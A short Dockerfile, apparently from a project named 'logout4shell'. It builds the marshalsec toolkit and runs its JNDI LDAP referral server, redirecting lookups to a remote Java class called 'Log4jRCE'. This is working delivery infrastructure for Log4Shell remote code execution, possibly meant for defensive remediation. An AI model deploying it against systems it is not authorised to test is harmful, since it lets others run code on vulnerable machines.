
FROM ubuntu:21.04 as ldap-builder
RUN mkdir /opt/build_logout4shell
RUN apt-get update && apt-get install -y git default-jdk maven
RUN cd /opt/build_logout4shell && git clone https://github.com/mbechler/marshalsec.git && cd ./marshalsec && git checkout f645788 && mvn package -DskipTests && ls ./target/classes
WORKDIR /opt/build_logout4shell/marshalsec/target
ENTRYPOINT [ "java", "-cp", "marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "'http://webserver:8888/#Log4jRCE'"] 
